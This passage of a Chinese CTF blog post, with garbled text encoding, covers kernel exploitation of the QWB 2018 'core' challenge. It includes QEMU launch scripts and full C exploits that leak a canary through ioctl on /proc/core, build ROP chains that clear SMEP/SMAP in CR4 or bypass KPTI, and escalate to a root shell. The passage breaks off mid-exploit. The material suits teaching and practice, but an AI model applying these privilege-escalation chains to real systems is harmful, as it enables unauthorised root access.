title="dzd2"></li><li><p>å†…æ ¸ç©ºé—´é¡µè¡¨ä¸­ç”¨æˆ·ç©ºé—´ä»£ç æ— æ‰§è¡Œæƒé™ï¼Œret2usrå½»åº•å¯„äº†</p></li></ul><h2 id="ä¾‹é¢˜ï¼šä¾ç„¶æ˜¯å…¸ä¸­å…¸å¼ºç½‘æ¯2018-core"><a href="#ä¾‹é¢˜ï¼šä¾ç„¶æ˜¯å…¸ä¸­å…¸å¼ºç½‘æ¯2018-core" class="headerlink" title="ä¾‹é¢˜ï¼šä¾ç„¶æ˜¯å…¸ä¸­å…¸å¼ºç½‘æ¯2018 - core"></a>ä¾‹é¢˜ï¼šä¾ç„¶æ˜¯å…¸ä¸­å…¸å¼ºç½‘æ¯2018 - core</h2><p>ä¸€ä¸ªå°ï¼ˆdaï¼‰æ’æ›²ï¼šropperå’ŒROPgadgetç”šè‡³IDAæ‰¾çš„gadgetä½ç½®å’Œå®é™…æ‰§è¡Œçš„ä½ç½® ä¸ä¸€æ ·ï¼Œæˆ‘tmèŠ±äº†æ˜¨å¤©ä¸€æ™šä¸Š+ä»Šå¤©ä¸€æ—©ä¸Šçš„æ—¶é—´è§£å†³è¿™ä¸ªé—®é¢˜ç»“æœä½ å‘Šè¯‰æˆ‘é¢˜ç›®çš„vmlinuxæœ‰é—®é¢˜ï¼ˆè°¢è°¢Lanternå¤§ä½¬çš„åšå®¢ï¼Œæ•‘äººä¸€å‘½èƒœé€ ä¸ƒçº§æµ®å± ï¼‰ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿç”¨vmlinux-to-elfé‡æ–°ä»bzImageä¸­ævmlinuxå°±æ²¡äº‹äº†ï¼Œæ·¦</p><h3 id="SMAP-x2F-SMEPç»•è¿‡çš„ret2usr"><a href="#SMAP-x2F-SMEPç»•è¿‡çš„ret2usr" class="headerlink" title="SMAP&#x2F;SMEPç»•è¿‡çš„ret2usr"></a>SMAP&#x2F;SMEPç»•è¿‡çš„ret2usr</h3><p>æ›´æ”¹åçš„start.shè„šæœ¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br>-m 256M \<br>-cpu qemu64-v1,+smep,+smap \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \<br>--nographic<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 #\<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-S -gdb tcp::1234</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…å•ç‹¬å…³é—­KPTI</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br>-m 256M \<br>-cpu kvm64,+smep,+smap \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr nopti&quot; \<br>--nographic<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 #\<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-S -gdb tcp::1234</span><br></code></pre></td></tr></table></figure><p>å‡è£…ä¸çŸ¥é“ï¼ˆè€æ™ä¸Šèº«( â€¢Ì€ Ï‰ â€¢Ì )âœ§ï¼‰è¿è¡Œä¸€ä¸‹ä¹‹å‰çš„exploit</p><img src="/2023/08/04/kernel-rop-ret2usr/error.png" class title="error"><p>æŠ¥é”™äº†æ~(ï¿£â–½ï¿£)~*</p><p>æ›´æ”¹ä¸€ä¸‹exploitï¼Œå¯ä»¥åˆ©ç”¨ä¸è¿ç®—å°†cr4çš„SMAPå’ŒSMEPä¸¤ä½æ¸…é›¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç»™cr4èµ‹å€¼0x6f0</p><p>è¿™æ¬¡çš„exploitç›´æ¥åˆ©ç”¨swapgs_restore_regs_and_return_to_usermodeå‡½æ•°è¿”å›ç”¨æˆ·æ€</p><p>ropperå’ŒROPgadgetçš„gadgetå…¨éƒ¨æå–æŒ‡ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary ./vmlinux &gt; ./rop_ROP.txt<br>ropper -f ./vmlinux --nocolor &gt; ./rop_ropper.txt<br></code></pre></td></tr></table></figure><p>ä¸æ“ä½œæ›´æ”¹cr4çš„expï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a008da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_CR4_RAX_PUSH_RCX_POPFQ_RET 0xffffffff81002515</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RAX_CR4_ADD_RSP_8_POP_RBX_RET 0xFFFFFFFF8106669C</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AND_RAX_RDI_RET 0xffffffff8102b45b</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> *commit_creds = <span class="hljs-literal">NULL</span>, *prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><br>    <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_privilige</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *(*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);        <br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. &quot;</span><br>         <span class="hljs-string">&quot;Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889b</span>, buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> off)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889c</span>, off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> nbytes)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889a</span>, nbytes);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    save_status();<br><br>    <span class="hljs-type">int</span> fd;<br>    fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the /proc/core !\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <br>    FILE *sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-type">char</span> type[<span class="hljs-number">0x10</span>], buf[<span class="hljs-number">0x50</span>];<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = (<span class="hljs-type">void</span> *)addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of &quot;</span><br>                   <span class="hljs-string">&quot;commit_cred:\033[0m%p\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(!prepare_kernel_cred &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = (<span class="hljs-type">void</span> *)addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of &quot;</span><br>                   <span class="hljs-string">&quot;prepare_kernel_cred:\033[0m%p\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;           <br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> offset;<br>    offset = (<span class="hljs-type">size_t</span>)commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-type">size_t</span> canary;<br>    set_off(fd, <span class="hljs-number">64</span>);<br>    core_read(fd, buf);<br>    canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>        rop_chain[i] = canary;<br>    rop_chain[i++] = MOV_RAX_CR4_ADD_RSP_8_POP_RBX_RET + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop_chain[i++] = POP_RDI_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0xffffffffffcfffff</span>;<br>    rop_chain[i++] = AND_RAX_RDI_RET + offset;<br>    rop_chain[i++] = MOV_CR4_RAX_PUSH_RCX_POPFQ_RET + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_privilige;<br>    rop_chain[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + offset + <span class="hljs-number">22</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp + <span class="hljs-number">8</span>;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x100</span>);<br>    core_copy_func(fd, <span class="hljs-number">0xffffffffffff0000</span> | <span class="hljs-number">0x100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›´æ¥ç»™cr4èµ‹å€¼çš„ropé“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    rop_chain[i] = canary;<br>rop_chain[i++] = POP_RAX_RET + offset;<br>rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0x6f0</span>;<br>rop_chain[i++] = MOV_CR4_RAX_PUSH_RCX_POPFQ_RET + offset;<br>rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_privilige;<br>rop_chain[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + offset + <span class="hljs-number">22</span>;<br>rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>rop_chain[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>rop_chain[i++] = user_cs;<br>rop_chain[i++] = user_rflags;<br>rop_chain[i++] = user_sp + <span class="hljs-number">8</span>;<br>rop_chain[i++] = user_ss;<br></code></pre></td></tr></table></figure><h3 id="KPTIç»•è¿‡-çº¯ROPæ— ret2usr"><a href="#KPTIç»•è¿‡-çº¯ROPæ— ret2usr" class="headerlink" title="KPTIç»•è¿‡+çº¯ROPæ— ret2usr"></a>KPTIç»•è¿‡+çº¯ROPæ— ret2usr</h3><p>å°±æ˜¯åˆ©ç”¨swapgs_restore_regs_and_return_to_usermodeæ²¡å•¥å¥½è¯´çš„ï¼Œä¸Šexpï¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a008da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> *commit_creds = <span class="hljs-literal">NULL</span>, *prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><br>    <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);        <br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. &quot;</span><br>         <span class="hljs-string">&quot;Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889b</span>, buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> off)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889c</span>, off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> nbytes)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889a</span>, nbytes);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    save_status();<br><br>    <span class="hljs-type">int</span> fd;<br>    fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the /proc/core !\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <br>    FILE *sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-type">char</span> type[<span class="hljs-number">0x10</span>], buf[<span class="hljs-number">0x50</span>];<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = (<span class="hljs-type">void</span> *)addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of &quot;</span><br>                   <span class="hljs-string">&quot;commit_cred:\033[0m%p\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(!prepare_kernel_cred &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = (<span class="hljs-type">void</span> *)addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of &quot;</span><br>                   <span class="hljs-string">&quot;prepare_kernel_cred:\033[0m%p\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;           <br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> offset;<br>    offset = (<span class="hljs-type">size_t</span>)commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-type">size_t</span> canary;<br>    set_off(fd, <span class="hljs-number">64</span>);<br>    core_read(fd, buf);<br>    canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-type">size_t</span> rop_chain[<span 